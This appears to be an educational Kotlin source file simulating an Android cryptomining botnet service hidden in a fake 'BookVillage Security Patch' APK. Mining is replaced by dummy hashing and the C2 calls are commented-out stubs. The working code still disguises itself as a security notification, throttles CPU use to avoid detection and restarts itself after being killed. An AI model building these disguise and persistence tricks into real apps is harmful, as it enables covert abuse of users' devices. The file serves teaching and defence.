package com.bookvillage.malware

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.security.MessageDigest

/**
 * ══════════════════════════════════════════════════════════════════════
 *  [Phase 4 & 5] 저자원 분산 채굴 봇넷 - 교육용 시뮬레이션
 *  BookVillage_Security_Patch.apk 내부 악성 서비스
 * ══════════════════════════════════════════════════════════════════════
 *
 * 공격 구조:
 *   1. [Phase 3] 사용자가 가짜 플레이 스토어에서 이 APK를 설치
 *   2. [Phase 4] MiningService가 Foreground Service로 시작
 *      - CPU 점유율 5~10%로 스로틀링 → 사용자 인지 회피
 *      - 실제 공격이라면 C2 서버에서 채굴 풀 주소 수신
 *   3. [Phase 5] BootReceiver가 재부팅 후 자동으로 이 서비스 재시작
 *
 * ⚠️  교육 목적 시뮬레이션:
 *      - 실제 암호화폐 채굴 없음 (SHA-256 더미 해시 연산으로 대체)
 *      - C2 통신 없음 (주석으로 구조만 표시)
 *      - 실제 공격 도구가 아닌 취약점 시연용 코드
 *
 * 방어 방법:
 *   - 설정 > 배터리 > 배터리 사용량에서 비정상 앱 확인
 *   - adb shell dumpsys activity services | grep bookvillage
 *   - 출처 불명 APK 설치 차단 (Google Play Protect 활성화)
 *   - 앱 권한 검토: FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED 불필요 시 차단
 * ══════════════════════════════════════════════════════════════════════
 */
class MiningService : Service() {

    companion object {
        private const val TAG = "BVSecurityPatch"
        private const val CHANNEL_ID = "bv_update_channel"
        private const val NOTIFICATION_ID = 1001

        // CPU 스로틀링 파라미터 (5~10% 점유율 유지)
        // 실제 공격: 기기 발열·배터리 소모로 인한 사용자 삭제를 회피하기 위해 제한
        private const val WORK_DURATION_MS  = 8L   // 8ms 연산 (5~10%)
        private const val REST_DURATION_MS  = 92L  // 92ms 휴식 → 총 100ms 주기
    }

    private var miningThread: Thread? = null
    @Volatile private var isRunning = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "[Phase 4] MiningService.onCreate() - 채굴 서비스 생성")
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "[Phase 4] MiningService.onStartCommand() - 채굴 시작")

        // 실제 공격이라면 여기서 C2 서버에서 채굴 풀 주소·지갑 주소 수신
        // val poolUrl  = fetchFromC2("$C2_SERVER/config/pool")
        // val walletId = fetchFromC2("$C2_SERVER/config/wallet")

        if (!isRunning) {
            isRunning = true
            startMiningSimulation()
        }

        // START_STICKY: 서비스가 강제 종료되면 시스템이 자동 재시작
        // → 사용자가 앱을 강제 종료해도 복원됨
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        miningThread?.interrupt()
        Log.d(TAG, "[Phase 4] MiningService.onDestroy() - 채굴 중단")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ── Foreground Service 알림 ─────────────────────────────────────────
    // Android 8.0(Oreo)+ 에서 백그라운드 서비스는 Foreground Service로
    // 실행해야 함 → 사용자에게 알림이 표시되나, 공격자는 정상처럼 위장
    private fun startForegroundWithNotification() {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val channel = NotificationChannel(
            CHANNEL_ID,
            "BookVillage 보안 업데이트",  // 정상 앱처럼 위장한 채널명
            NotificationManager.IMPORTANCE_LOW   // LOW: 알림음 없음 → 덜 눈에 띔
        )
        manager.createNotificationChannel(channel)

        // 사용자 의심을 낮추기 위해 정상 보안 서비스처럼 위장한 알림
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("BookVillage 보안 서비스")
            .setContentText("기기 보안을 유지하고 있습니다.")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)  // 사용자가 스와이프로 닫을 수 없음
            .build()

        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "[Phase 4] Foreground Service 시작 - 위장 알림 표시")
    }

    // ── 채굴 시뮬레이션 (CPU 스로틀링) ────────────────────────────────────
    //
    // 실제 공격에서의 Monero(XMR) CryptoNight 채굴 구조:
    //   while (running) {
    //       val hash = cryptoNightHash(nonce.toByteArray())  // 실제 채굴 연산
    //       if (meetsTarget(hash, difficulty)) reportShare(poolUrl, hash)
    //       nonce++
    //       throttle()
    //   }
    //
    // 이 코드는 교육용으로 SHA-256 더미 연산으로 대체
    private fun startMiningSimulation() {
        miningThread = Thread {
            Log.d(TAG, "[Phase 4] 채굴 스레드 시작 (CPU 스로틀링: ${WORK_DURATION_MS}ms 연산 / ${REST_DURATION_MS}ms 휴식)")
            var nonce = 0L
            val md = MessageDigest.getInstance("SHA-256")

            while (isRunning && !Thread.currentThread().isInterrupted) {
                val workEnd = System.currentTimeMillis() + WORK_DURATION_MS

                // ── 작업 구간: SHA-256 더미 해시 연산 (실제 채굴 시뮬레이션) ──
                // 실제 XMR 채굴이라면 CryptoNight 알고리즘 사용
                while (System.currentTimeMillis() < workEnd) {
                    md.update(nonce.toString().toByteArray())
                    val hash = md.digest()
                    // 실제 공격: if (hash[0].toInt() == 0) submitShareToPool(hash, nonce)
                    nonce++
                }

                // ── 휴식 구간: CPU 해제 → 점유율 5~10% 유지 ──────────────────
                // 기기 발열·배터리 소모 최소화 → 사용자 인지 회피
                try {
                    Thread.sleep(REST_DURATION_MS)
                } catch (e: InterruptedException) {
                    Thread.currentThread().interrupt()
                    break
                }

                if (nonce % 10_000L == 0L) {
                    Log.d(TAG, "[Phase 4] 채굴 진행 중: nonce=$nonce (CPU ~${WORK_DURATION_MS}%)")
                    // 실제 공격: 누적 해시 파워를 C2 서버에 보고
                    // reportHashrateToC2(nonce, poolUrl)
                }
            }
            Log.d(TAG, "[Phase 4] 채굴 스레드 종료")
        }.also {
            it.name = "mining-worker"
            it.isDaemon = false  // 데몬 스레드 아님 → 앱 프로세스 종료를 늦춤
            it.start()
        }
    }
}
